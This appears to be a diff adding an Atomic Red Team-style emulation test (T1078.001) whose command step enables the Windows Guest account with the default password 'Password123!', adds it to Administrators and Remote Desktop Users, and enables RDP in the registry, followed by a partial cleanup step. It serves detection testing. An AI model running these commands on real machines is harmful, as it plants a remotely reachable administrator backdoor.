@@ -1,0 +1,76 @@
+{
+  "id": "99747561-ed8d-47f2-9c91-1e5fde1ed6e0",
+  "name": "Enable Guest account with RDP capability and admin privileges",
+  "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "25625ff5-d7f1-460e-82db-3de12ff47ecd",
+      "type": "execute-command",
+      "data": {
+        "command": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7e21afa5-ce92-49ce-a636-599a49147986",
+      "type": "execute-command",
+      "data": {
+        "command": "net user #{guest_user} /active:no \u003enul 2\u003e\u00261\nnet localgroup #{local_admin_group} #{guest_user} /delete \u003enul 2\u003e\u00261\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete \u003enul 2\u003e\u00261\nif #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f \u003enul 2\u003e\u00261)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f \u003enul 2\u003e\u00261)",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "25625ff5-d7f1-460e-82db-3de12ff47ecd",
+      "p": "on-success",
+      "o": "7e21afa5-ce92-49ce-a636-599a49147986"
+    },
+    {
+      "s": "25625ff5-d7f1-460e-82db-3de12ff47ecd",
+      "p": "on-failure",
+      "o": "7e21afa5-ce92-49ce-a636-599a49147986"
+    }
+  ],
+  "tags": [
+    "T1078.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "guest_user",
+      "type": "string",
+      "description": "Specify the guest account",
+      "value": "guest"
+    },
+    {
+      "name": "guest_password",
+      "type": "string",
+      "description": "Specify the guest password",
+      "value": "Password123!"
+    },
+    {
+      "name": "local_admin_group",
+      "type": "string",
+      "description": "Specify the admin localgroup name",
+      "value": "Administrators"
+    },
+    {
+      "name": "remote_desktop_users_group_name",
+      "type": "string",
+      "description": "Specify the remote desktop users group name",
+      "value": "Remote Desktop Users"
+    },
+    {
+      "name": "remove_rdp_access_during_cleanup",
+      "type": "integer",
+      "description": "Set to 1 if you want the cleanup to remove RDP access to machine",
+      "value": "0"
+    }
+  ]
+}
